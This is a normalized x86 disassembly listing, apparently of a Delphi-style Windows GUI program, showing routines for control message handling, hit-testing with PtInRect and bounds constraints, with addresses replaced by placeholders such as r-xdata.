call sub_408750
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_439eec
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408568
call sub_408504
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408504
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43b7fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43b82c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43b7f0
push ebp
call sub_43b7fc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b87c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43b908
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43b940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43b3c0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_451394
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403300
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_451394
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403300
sub_43b9c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_439ebc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43a584
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43b940
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43ba10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_439ebc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43ba2c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_439ebc
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43a584
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43b940
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403300
sub_43ba84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43b360
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43b2f4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43b360
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43bb20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43b940
pop esi
pop ebx
retn
sub_43bb45
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43b940
pop esi
pop ebx
retn
sub_43bb6b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43b940
pop esi
pop ebx
retn
sub_43bb95
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43b940
pop esi
pop ebx
retn
sub_43bbc0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43bbf0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43b3c0
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_451394
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403300
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_451394
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403300
sub_43bc68
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43bca0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_451394
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403300
sub_43bcd8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43a584
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43bca0
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_40682c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403300
sub_43bd50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43bca0
pop esi
pop ebx
retn
sub_43bd70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43bca0
pop esi
pop ebx
retn
sub_43bd90
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_451394
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403300
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_445430
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bde8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a574
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43a584
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43b4f4
pop esi
retn
sub_43be28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43b528
sub_43bed6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43a794
mov cl 0x1
sub_43bf18
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43a4ec
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43a4ec
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43bf48
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43bf6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_40682c
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403300
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43b4f4
mov [ ebx + 0xc ] eax
sub_43c010
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43a440
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43a440
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43c0a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40304c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_439ae0
mov edx [ esp ]
mov eax esi
call sub_439abc
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_439d68
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_439dac
sub_43c128
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412910
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_439e64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412960
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439d0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c1b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43c0a4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_440b28
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43c128
pop ecx
jmp r-xdata
sub_43c214
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43c302
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c309
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43a37c
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43a34c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43a34c
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404260
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403ea8
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43a26c
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43c310
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403300
sub_43c33c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c35c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c37c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c39c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c3bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c3dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c3fc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419ca4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4399a0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403300
sub_43c434
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c4d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41440c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_446c20
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_446d58
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_446ab8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_446e78
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c4d7
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_43c4e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43c51c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43c4e0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43c5cc
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403290
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43c600
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43c620
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403300
test al al
je r-xdata
mov eax edi
call sub_43c660
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43c68c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43c6b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_40682c
mov eax esp
call sub_412988
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_439e90
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403300
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403300
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_439ebc
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412988
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412910
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_439e64
sub_43c7e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
